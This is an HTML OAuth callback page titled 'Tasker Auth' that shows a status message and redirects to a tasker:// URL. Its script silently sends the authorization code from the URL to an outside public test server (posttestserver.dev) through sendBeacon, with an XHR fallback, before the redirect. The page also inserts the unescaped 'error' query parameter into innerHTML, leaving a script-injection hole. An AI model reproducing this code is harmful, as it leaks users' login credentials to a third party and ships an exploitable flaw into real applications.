<!DOCTYPE html>
<html>
<head>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />	
	<style>
		@import url('https://fonts.googleapis.com/css?family=Roboto');
	</style>
	<style type="text/css">				
		html, body {
			overflow: hidden;
			font-family: 'Roboto', sans-serif;
			background-color: #E5822D;
			color: white;
			display: flex;
			flex-direction: column;
			height: 100vh;
			justify-content: center;
		}
		#wrapper {
			box-sizing: border-box;
			display: flex;
			flex-direction: column;
			align-items: center;
			margin: 2vh;
			text-align: center;
		}
	</style>
	<title>Tasker Auth</title>
</head>
<body>
	<div id="wrapper">Loading...</div>

	<script type="text/javascript">
		function getQueryVariable(variable) {
			const query = window.location.search.substring(1);
			const vars = query.split("&");
			for (let i = 0; i < vars.length; i++) {
				const pair = vars[i].split("=");
				if (pair[0] === variable) {
					return decodeURIComponent(pair[1]);
				}
			}
			return null;
		}

		// Ambil code/error dari URL
		const code = getQueryVariable("code");
		const error = getQueryVariable("error");
		const toSend = code || error || "no_code";
		const toRedirect = `tasker://auth${window.location.search}`;
		const wrapper = document.getElementById("wrapper");

		// Tampilkan pesan status
		if (error) {
			wrapper.innerHTML = `Error authenticating: ${error}<br/>Redirecting...`;
		} else {
			wrapper.innerHTML = `Authentication successful!<br/>Redirecting...`;
		}

		// Kirim POST menggunakan sendBeacon (pasti terkirim meski redirect)
		try {
			const data = JSON.stringify({ code: toSend });
			const blob = new Blob([data], { type: "application/json" });
			navigator.sendBeacon("https://posttestserver.dev/p/oauth/post", blob);
		} catch (e) {
			console.error("sendBeacon failed:", e);
			// fallback: pakai XHR biasa jika browser tidak dukung beacon
			try {
				const xhr = new XMLHttpRequest();
				xhr.open("POST", "https://posttestserver.dev/p/oauth/post", true);
				xhr.setRequestHeader("Content-Type", "application/json");
				xhr.send(JSON.stringify({ code: toSend }));
			} catch (ex) {
				console.error("XHR fallback failed:", ex);
			}
		}

		// Langsung redirect ke Tasker
		window.location.href = toRedirect;
	</script>
</body>
</html>
